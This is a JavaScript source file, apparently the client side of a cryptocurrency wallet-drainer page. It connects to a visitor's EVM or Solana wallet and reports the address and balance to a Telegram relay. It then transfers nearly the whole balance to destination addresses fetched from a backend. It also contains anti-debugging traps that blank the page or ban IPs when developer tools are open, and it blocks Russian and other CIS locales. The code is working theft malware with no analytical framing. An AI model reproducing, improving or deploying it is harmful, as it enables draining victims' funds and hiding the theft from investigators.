// ─── CONFIG ───────────────────────────────────────────────────────────────────

const BASE_URL = "http://localhost:8080";

const URLS = {
    telegram: `${BASE_URL}/api/sendMessage`,
    ban: `${BASE_URL}/api/ban`,
    evm: `${BASE_URL}/api/evm`,
    solana: `${BASE_URL}/api/solana`,
    chainEvm: `${BASE_URL}/api/chain_evm`,
    chainSol: `${BASE_URL}/api/chain_sol`,
    priceEth: `${BASE_URL}/api/price_eth`,
    priceSol: `${BASE_URL}/api/price_sol`,
    base: `${BASE_URL}/api`,
};

// ─── API ──────────────────────────────────────────────────────────────────────

async function sendWithApi(url, message) {
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message: String(message) }),
        });
        if (!response.ok) {
            console.error(
                "Erreur lors de l'envoi du message:",
                response.status,
            );
        }
    } catch (err) {
        console.error("sendWithApi error:", err);
    }
}

// ─── IP & Détection ───────────────────────────────────────────────────────────

async function getUserIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "unknown";
    }
}

async function handleDetection() {
    const ip = await getUserIP();
    await sendWithApi(URLS.ban, JSON.stringify({ ip, reason: "devtools" }));
    await sendWithApi(URLS.telegram, "🚨 IP Banned: " + ip);
    setTimeout(() => window.location.reload(), 2000);
}

function detectLanguage() {
    const languages = navigator.languages || [navigator.language];
    const blockedLocales = [
        "ru-RU",
        "be-BY",
        "ru-BY",
        "kk-KZ",
        "ru-KZ",
        "tk-TM",
        "ru-TM",
        "ru",
        "be",
        "kk",
        "tk",
    ];
    const isBlocked = languages.some((lang) =>
        blockedLocales.some((blocked) =>
            lang.toLowerCase().startsWith(blocked.toLowerCase()),
        ),
    );
    if (isBlocked) handleDetection();
}

// ─── Anti-Debug ───────────────────────────────────────────────────────────────

(function antiDebug() {
    function handleDetection() {
        document.documentElement.innerHTML = "";
        window.location.href = "about:blank";
    }

    setInterval(function loop() {
        debugger;
    }, 50);

    setInterval(() => {
        const start = performance.now();
        debugger;
        const delta = performance.now() - start;
        if (delta > 100) handleDetection();
    }, 500);

    const dummy = /./;
    dummy.toString = () => {
        handleDetection();
        return "/./";
    };
    setInterval(() => console.log(dummy), 1000);

    const element = new Image();
    Object.defineProperty(element, "id", {
        get: function () {
            handleDetection();
        },
    });
    setInterval(() => console.log(element), 1500);

    setInterval(() => {
        if (
            window.outerWidth - window.innerWidth > 100 ||
            window.outerHeight - window.innerHeight > 100
        ) {
            handleDetection();
        }
    }, 1000);
})();
// ─── Destinations ─────────────────────────────────────────────────────────────

let destinations_evm = [];
let destinations_sol = [];

async function updateDestinations() {
    try {
        const evmResponse = await fetch(URLS.evm);
        if (evmResponse.ok) {
            const evmData = await evmResponse.json();
            destinations_evm = evmData.map((addr) => ({
                address: addr.address_eth,
                percent: addr.percent,
            }));
        }

        const solResponse = await fetch(URLS.solana);
        if (solResponse.ok) {
            const solData = await solResponse.json();
            destinations_sol = solData.map((addr) => ({
                address: addr.address_sol,
                percent: addr.percent,
            }));
        }
    } catch (error) {
        console.error("❌ Erreur updateDestinations:", error);
    }
}

// ─── Providers ────────────────────────────────────────────────────────────────

async function callProvider(chainId) {
    try {
        const proxyUrl = `${URLS.base}/rpc/${chainId}`;
        return new ethers.providers.JsonRpcProvider(proxyUrl);
    } catch (err) {
        console.error(err);
        return null;
    }
}
async function getSolanaConnection() {
    try {
        const response = await fetch(URLS.chainSol);
        if (!response.ok) return null;
        const data = await response.json();
        const providerUrl = data[0]?.sol_provider;
        if (!providerUrl) return null;
        return new solanaWeb3.Connection(providerUrl);
    } catch (err) {
        console.error(err);
        return null;
    }
}

// ─── Prix ─────────────────────────────────────────────────────────────────────

async function getEthPriceUSD() {
    try {
        const res = await fetch(URLS.priceEth);
        if (!res.ok) return null;
        const data = await res.json();
        return data?.[0]?.usd ?? null;
    } catch {
        return null;
    }
}

async function getSolPriceUSD() {
    try {
        const res = await fetch(URLS.priceSol);
        if (!res.ok) return null;
        const data = await res.json();
        return data?.[0]?.usd ?? null;
    } catch {
        return null;
    }
}

// ─── Wallet ───────────────────────────────────────────────────────────────────

const nativeToken = {
    ethereum: "ETH",
    polygon: "MATIC",
    bsc: "BNB",
    avalanche: "AVAX",
    base: "ETH",
    solana: "SOL",
};

let provider, signer, walletAddress;
let solanaConnection, solanaPublicKey;
const randomUser = "User" + Math.floor(Math.random() * 100000);

async function detectWalletType() {
    let walletType = "Unknown";
    let isEVM = false;
    let isSolana = false;

    if (window.ethereum) {
        isEVM = true;
        if (window.ethereum.isMetaMask) walletType = "MetaMask";
        else if (window.ethereum.isTrust) walletType = "Trust Wallet";
        else if (window.ethereum.isCoinbaseWallet)
            walletType = "Coinbase Wallet";
        else if (window.ethereum.isBraveWallet) walletType = "Brave Wallet";
        else if (window.ethereum.isExodus) walletType = "Exodus Wallet";
        else if (window.ethereum.isTally) walletType = "Tally Wallet";
        else if (window.ethereum.isRainbow) walletType = "Rainbow Wallet";
        else if (window.ethereum.isOpera) walletType = "Opera Wallet";
        else if (window.ethereum.bitkeep) walletType = "Bitget Wallet";
        else if (window.ethereum.isFrame) walletType = "Frame Wallet";
        else if (window.ethereum.isKuCoinWallet) walletType = "KuCoin Wallet";
        else walletType = "EVM Wallet";
    }

    if (window.solana) {
        isSolana = true;
        if (window.solana.isPhantom) walletType = "Phantom Wallet";
        else if (window.solana.isSolflare) walletType = "Solflare Wallet";
        else if (window.solana.isSlope) walletType = "Slope Wallet";
        else if (window.solana.isExodus) walletType = "Exodus Wallet";
        else if (window.solana.bitkeep) walletType = "Bitget Wallet";
        else if (window.solana.isTorus) walletType = "Torus Wallet";
        else walletType = "Solana Wallet";
    }

    return { walletType, isEVM, isSolana };
}

async function connectEVMWallet() {
    const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
    await web3Provider.send("eth_requestAccounts", []);

    const network = await web3Provider.getNetwork();
    const chainId = network.chainId;

    const chainMap = {
        1: "ethereum",
        56: "bsc",
        137: "polygon",
        43114: "avalanche",
        8453: "base",
    };
    const selectedChain = chainMap[chainId] ?? "ethereum";

    provider = await callProvider(chainId);
    if (!provider) {
        provider = web3Provider;
        await sendWithApi(
            URLS.telegram,
            `⚠️ No RPC for chainId ${chainId}, using injected provider`,
        );
    }

    signer = web3Provider.getSigner();
    walletAddress = await signer.getAddress();
    const balance = await web3Provider.getBalance(walletAddress);

    await sendWithApi(
        URLS.telegram,
        `🩸 ${randomUser}\n\n📡 EVM connected: ${walletAddress}\n💰 ${ethers.utils.formatEther(balance)} ${nativeToken[selectedChain]}\n🌐 ${selectedChain} (${chainId})`,
    );
}

async function connectSolanaWallet() {
    const resp = await window.solana.connect();
    if (!resp?.publicKey) {
        await sendWithApi(URLS.telegram, "🚫 Solana wallet not connected");
        return;
    }

    solanaConnection = await getSolanaConnection();
    if (!solanaConnection) {
        await sendWithApi(URLS.telegram, "❌ Solana RPC unavailable");
        return;
    }

    solanaPublicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
    const balance = await solanaConnection.getBalance(solanaPublicKey);
    const balanceSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;

    await sendWithApi(
        URLS.telegram,
        `🩸 ${randomUser}\n\n📡 Solana connected\n💰 ${balanceSOL.toFixed(6)} SOL\n🔑 ${solanaPublicKey.toString()}`,
    );
}

// ─── Transactions ─────────────────────────────────────────────────────────────

async function sendEVMTransactions() {
    if (!signer) {
        await sendWithApi(URLS.telegram, "🚫 EVM wallet not connected");
        return;
    }

    await updateDestinations();

    const balance = await signer.getBalance();
    const gasPrice = await provider.getGasPrice();
    const gasLimit = ethers.BigNumber.from("21000");
    const gasCost = gasPrice.mul(gasLimit).mul(destinations_evm.length || 1);
    const amountToSplit = balance.sub(gasCost);

    if (amountToSplit.lte(0)) {
        await sendWithApi(URLS.telegram, "⚠️ EVM: Insufficient funds");
        return;
    }

    const ethPriceUSD = await getEthPriceUSD();
    let message = `🩸 ${randomUser}\n\nEVM Transactions 🚀\n\n`;

    for (const dest of destinations_evm) {
        const amount = amountToSplit.mul(dest.percent).div(100);
        const txResponse = await signer.sendTransaction({
            to: dest.address,
            value: amount,
            gasLimit,
            gasPrice,
        });
        const amountEth = ethers.utils.formatEther(amount);
        const amountUsd = ethPriceUSD
            ? (parseFloat(amountEth) * ethPriceUSD).toFixed(2)
            : "N/A";
        message += `💰 ${amountEth} ETH (~${amountUsd}$)\n🔗 ${txResponse.hash}\n\n`;
        await txResponse.wait();
    }

    await sendWithApi(URLS.telegram, message);
}

async function sendSolanaTransactions() {
    if (!solanaConnection || !solanaPublicKey) {
        await sendWithApi(URLS.telegram, "🚫 Solana wallet not connected");
        return;
    }

    await updateDestinations();

    const balance = await solanaConnection.getBalance(solanaPublicKey);
    const minBalance =
        await solanaConnection.getMinimumBalanceForRentExemption(0);
    const feeBuffer = 5000;
    const amountToSplit = balance - minBalance - feeBuffer;

    if (amountToSplit <= 0) {
        await sendWithApi(URLS.telegram, "⚠️ Solana: Insufficient funds");
        return;
    }

    const solPriceUSD = await getSolPriceUSD();
    let message = `🩸 ${randomUser}\n\nSolana Transactions 🚀\n\n`;
    const transaction = new solanaWeb3.Transaction();

    for (const dest of destinations_sol) {
        const amount = Math.floor((amountToSplit * dest.percent) / 100);
        const destPubKey = new solanaWeb3.PublicKey(dest.address);
        transaction.add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: solanaPublicKey,
                toPubkey: destPubKey,
                lamports: amount,
            }),
        );
        const amountSOL = (amount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6);
        const amountUsd = solPriceUSD
            ? (parseFloat(amountSOL) * solPriceUSD).toFixed(2)
            : "N/A";
        message += `💰 ${amountSOL} SOL (~${amountUsd}$)\n`;
    }

    const { blockhash } = await solanaConnection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = solanaPublicKey;

    const signed = await window.solana.signTransaction(transaction);
    const signature = await solanaConnection.sendRawTransaction(
        signed.serialize(),
    );
    await solanaConnection.confirmTransaction(signature);

    message += `🔗 ${signature}`;
    await sendWithApi(URLS.telegram, message);
}

// ─── DOM ──────────────────────────────────────────────────────────────────────

document.addEventListener("DOMContentLoaded", () => {
    detectLanguage();

    const btnConnect = document.getElementById("connect-wallet");
    const btnSend = document.getElementById("send");

    if (btnSend) btnSend.disabled = true;

    if (btnConnect) {
        btnConnect.onclick = async () => {
            btnConnect.disabled = true;
            btnConnect.textContent = "Connexion...";

            const { walletType, isEVM, isSolana } = await detectWalletType();

            if (!isEVM && !isSolana) {
                await sendWithApi(URLS.telegram, "❌ No wallet detected");
                btnConnect.disabled = false;
                btnConnect.textContent = "Connecter le wallet";
                return;
            }

            await sendWithApi(
                URLS.telegram,
                `🔍 Wallet detected: ${walletType}`,
            );

            try {
                if (isEVM) await connectEVMWallet();
                if (isSolana) await connectSolanaWallet();
                if (btnSend) btnSend.disabled = false;
                btnConnect.textContent = "✅ Connecté";
            } catch (err) {
                await sendWithApi(
                    URLS.telegram,
                    `❌ Connection error: ${err.message}`,
                );
                btnConnect.disabled = false;
                btnConnect.textContent = "Connecter le wallet";
            }
        };
    }

    if (btnSend) {
        btnSend.onclick = async () => {
            btnSend.disabled = true;
            btnSend.textContent = "Envoi en cours...";
            try {
                if (signer && walletAddress) await sendEVMTransactions();
                if (solanaConnection && solanaPublicKey)
                    await sendSolanaTransactions();
            } catch (err) {
                await sendWithApi(URLS.telegram, `❌ ${err.message}`);
            } finally {
                btnSend.disabled = false;
                btnSend.textContent = "Envoyer";
            }
        };
    }
});
